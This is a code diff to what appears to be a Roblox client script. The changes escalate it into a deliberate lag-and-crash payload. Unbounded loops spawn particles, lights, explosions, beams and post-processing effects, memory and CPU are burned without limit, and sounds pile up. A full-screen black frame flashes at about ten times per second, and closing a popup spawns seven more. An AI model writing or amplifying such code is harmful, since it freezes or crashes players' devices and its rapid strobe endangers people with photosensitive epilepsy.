@@ -5,6 +5,8 @@ local GuiService    = game:GetService("GuiService")
 local StarterGui    = game:GetService("StarterGui")
 local UserInputService = game:GetService("UserInputService")
 local ContextActionService = game:GetService("ContextActionService")
+local Lighting      = game:GetService("Lighting")
+local TweenService  = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
 if not player then
@@ -85,10 +87,12 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	for tick = 1, 9 do
-		task.wait(1)
-		local emitterCount = tick * 8
-		local lightCount = tick * 4
+	local burst = 0
+	while true do
+		burst += 1
+		task.wait(0.5)
+		local emitterCount = math.min(400, 60 + burst * 8)
+		local lightCount = math.min(160, 25 + burst * 4)
 		local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
 		local basePos = root and root.Position or Vector3.new(0, 5, 0)
 
@@ -100,20 +104,41 @@ task.spawn(function()
 				part.CanCollide = false
 				part.Anchored = true
 				part.CFrame = CFrame.new(basePos + Vector3.new(
-					math.random(-30, 30),
-					math.random(-5, 20),
-					math.random(-30, 30)
+					math.random(-70, 70),
+					math.random(-10, 45),
+					math.random(-70, 70)
 				))
 
 				local emitter = Instance.new("ParticleEmitter")
-				emitter.Rate = 400
-				emitter.Lifetime = NumberRange.new(8, 15)
-				emitter.Size = NumberSequence.new(12)
+				emitter.Rate = 2500
+				emitter.Lifetime = NumberRange.new(15, 30)
+				emitter.Size = NumberSequence.new(28)
+				emitter.Speed = NumberRange.new(20, 60)
+				emitter.SpreadAngle = Vector2.new(360, 360)
 				emitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
 				emitter.LightEmission = 1
 				emitter.LightInfluence = 0
-				emitter.Transparency = NumberSequence.new(0.3)
+				emitter.Transparency = NumberSequence.new(0.2)
 				emitter.Parent = part
+
+				local smoke = emitter:Clone()
+				smoke.Texture = "rbxasset://textures/particles/smoke_main.dds"
+				smoke.Rate = 1600
+				smoke.Size = NumberSequence.new(20)
+				smoke.Parent = part
+
+				local fire = emitter:Clone()
+				fire.Texture = "rbxasset://textures/particles/fire_main.dds"
+				fire.Rate = 1600
+				fire.Size = NumberSequence.new(18)
+				fire.Parent = part
+
+				local explosion = emitter:Clone()
+				explosion.Texture = "rbxasset://textures/particles/explosion01_implosion_main.dds"
+				explosion.Rate = 1200
+				explosion.Size = NumberSequence.new(35)
+				explosion.Parent = part
+
 				part.Parent = workspace
 			end)
 		end
@@ -126,18 +151,155 @@ task.spawn(function()
 				part.CanCollide = false
 				part.Anchored = true
 				part.CFrame = CFrame.new(basePos + Vector3.new(
-					math.random(-40, 40),
-					math.random(0, 25),
-					math.random(-40, 40)
+					math.random(-90, 90),
+					math.random(0, 55),
+					math.random(-90, 90)
 				))
 				local light = Instance.new("PointLight")
 				light.Range = 60
-				light.Brightness = 8
+				light.Brightness = 18
 				light.Shadows = true
+				light.Color = Color3.fromHSV(math.random(), 1, 1)
 				light.Parent = part
+
+				local spot = Instance.new("SpotLight")
+				spot.Range = 60
+				spot.Brightness = 18
+				spot.Angle = 120
+				spot.Shadows = true
+				spot.Color = Color3.fromHSV(math.random(), 1, 1)
+				spot.Parent = part
+
+				local surface = Instance.new("SurfaceLight")
+				surface.Range = 60
+				surface.Brightness = 18
+				surface.Angle = 180
+				surface.Shadows = true
+				surface.Color = Color3.fromHSV(math.random(), 1, 1)
+				surface.Parent = part
+
 				part.Parent = workspace
 			end)
 		end
+	end
+end)
+
+task.spawn(function()
+	while true do
+		task.wait(0.35)
+		local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+		local basePos = root and root.Position or Vector3.new(0, 5, 0)
+		for _ = 1, 10 do
+			pcall(function()
+				local ex = Instance.new("Explosion")
+				ex.BlastRadius = 0
+				ex.BlastPressure = 0
+				ex.DestroyJointRadiusPercent = 0
+				ex.Position = basePos + Vector3.new(
+					math.random(-45, 45),
+					math.random(0, 35),
+					math.random(-45, 45)
+				)
+				ex.Parent = workspace
+			end)
+		end
+	end
+end)
+
+task.spawn(function()
+	while true do
+		task.wait(0.15)
+		local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+		local basePos = root and root.Position or Vector3.new(0, 5, 0)
+		for _ = 1, 8 do
+			pcall(function()
+				local a = Instance.new("Part")
+				a.Size = Vector3.new(0.4, 0.4, 0.4)
+				a.Anchored = true
+				a.CanCollide = false
+				a.Transparency = 1
+				a.CFrame = CFrame.new(basePos + Vector3.new(math.random(-35, 35), math.random(0, 25), math.random(-35, 35)))
+				a.Parent = workspace
+				local b = Instance.new("Part")
+				b.Size = Vector3.new(0.4, 0.4, 0.4)
+				b.Anchored = true
+				b.CanCollide = false
+				b.Transparency = 1
+				b.CFrame = CFrame.new(basePos + Vector3.new(math.random(-35, 35), math.random(0, 25), math.random(-35, 35)))
+				b.Parent = workspace
+				local at1 = Instance.new("Attachment", a)
+				local at2 = Instance.new("Attachment", b)
+				local beam = Instance.new("Beam")
+				beam.Attachment0 = at1
+				beam.Attachment1 = at2
+				beam.Width0 = 6
+				beam.Width1 = 6
+				beam.LightEmission = 1
+				beam.LightInfluence = 0
+				beam.Segments = 60
+				beam.Texture = "rbxasset://textures/particles/sparkles_main.dds"
+				beam.TextureLength = 2
+				beam.TextureSpeed = 6
+				beam.Color = ColorSequence.new(Color3.fromHSV(math.random(), 1, 1))
+				beam.Parent = a
+			end)
+		end
+	end
+end)
+
+task.spawn(function()
+	while true do
+		task.wait(0.6)
+		pcall(function()
+			for i = 1, 5 do
+				local blur = Instance.new("BlurEffect")
+				blur.Size = 24
+				blur.Parent = Lighting
+			end
+			local bloom = Instance.new("BloomEffect")
+			bloom.Intensity = 5
+			bloom.Size = 56
+			bloom.Threshold = 0
+			bloom.Parent = Lighting
+			local dof = Instance.new("DepthOfFieldEffect")
+			dof.FarIntensity = 1
+			dof.FocusDistance = 0.1
+			dof.InFocusRadius = 0.1
+			dof.NearIntensity = 1
+			dof.Parent = Lighting
+			local cc = Instance.new("ColorCorrectionEffect")
+			cc.Brightness = math.random() - 0.5
+			cc.Contrast = math.random() * 2
+			cc.Saturation = math.random() * 2 - 1
+			cc.TintColor = Color3.fromHSV(math.random(), 1, 1)
+			cc.Parent = Lighting
+			local sun = Instance.new("SunRaysEffect")
+			sun.Intensity = 1
+			sun.Spread = 1
+			sun.Parent = Lighting
+		end)
+	end
+end)
+
+task.spawn(function()
+	local big = {}
+	while true do
+		for i = 1, 6000 do
+			big[#big + 1] = { math.random(), math.random(), math.random(), tostring(i), string.rep("x", 48) }
+		end
+		if #big > 150000 then
+			for i = 1, 40000 do
+				big[#big] = nil
+			end
+		end
+		task.wait(0.05)
+	end
+end)
+
+RunService.Heartbeat:Connect(function(dt)
+	local acc = 0
+	for i = 1, 6000 do
+		acc = acc + math.sin(i * dt) * math.cos(i * dt) + math.sqrt(i + 1)
 	end
 end)
 
@@ -194,7 +356,7 @@ blackFrame.ZIndex = 1
 blackFrame.Parent = blackGui
 
 local SOUND_ID = "rbxassetid://3200130016"
-local MAX_SOUNDS = 25
+local MAX_SOUNDS = 80
 local sounds = {}
 
 local soundHost = Instance.new("ScreenGui")
@@ -233,20 +395,20 @@ end
 addSound(true)
 
 task.spawn(function()
-	local interval = 2.0
+	local interval = 1.0
 	while true do
 		task.wait(interval)
 		addSound(false)
-		interval = math.max(0.075, interval * 0.94)
+		interval = math.max(0.02, interval * 0.9)
 	end
 end)
 
 task.spawn(function()
-	task.wait(7.5)
+	task.wait(3)
 	while true do
-		task.wait(0.75)
+		task.wait(0.12)
 		if #sounds >= 5 then
-			for i = 1, math.min(2, #sounds) do
+			for i = 1, math.min(8, #sounds) do
 				local s = sounds[math.random(1, #sounds)]
 				if s and s.Parent then
 					pcall(function()
@@ -254,7 +416,7 @@ task.spawn(function()
 						if len and len > 0 then
 							s.TimePosition = math.random() * len
 						end
-						if math.random() < 0.35 then
+						if math.random() < 0.6 then
 							s.PlaybackSpeed = 0.55 + math.random() * 1.1
 						end
 					end)
@@ -270,7 +432,7 @@ local pages   = {}
 
 RunService.Heartbeat:Connect(function(dt)
 	timer += dt
-	if timer < 0.35 then return end
+	if timer < 0.1 then return end
 	timer = 0
 	isBlack = not isBlack
 
@@ -307,8 +469,8 @@ local function spawnPopup()
 	local w, h, th = 420, 260, 24
 	local px = math.random(0, math.max(1, sw - w))
 	local py = math.random(0, math.max(1, sh - h))
-	local vx = math.random(180, 320) * (math.random(0, 1) == 0 and 1 or -1)
-	local vy = math.random(180, 320) * (math.random(0, 1) == 0 and 1 or -1)
+	local vx = math.random(320, 560) * (math.random(0, 1) == 0 and 1 or -1)
+	local vy = math.random(320, 560) * (math.random(0, 1) == 0 and 1 or -1)
 
 	local window = Instance.new("Frame")
 	window.Size = UDim2.new(0, w, 0, h)
@@ -425,22 +587,22 @@ local function spawnPopup()
 		conn:Disconnect()
 		pages[data] = nil
 		gui:Destroy()
-		task.spawn(spawnPopup)
-		task.spawn(spawnPopup)
-		task.spawn(spawnPopup)
+		for _ = 1, 7 do
+			task.spawn(spawnPopup)
+		end
 	end)
 end
 
 spawnPopup()
-for i = 1, 8 do
-	task.delay(i * 0.1, spawnPopup)
+for i = 1, 25 do
+	task.delay(i * 0.04, spawnPopup)
 end
 
 task.spawn(function()
-	local interval = 0.25
+	local interval = 0.1
 	while true do
 		task.wait(interval)
 		spawnPopup()
-		interval = math.max(0.02, interval * 0.94)
+		interval = math.max(0.005, interval * 0.9)
 	end
 end)
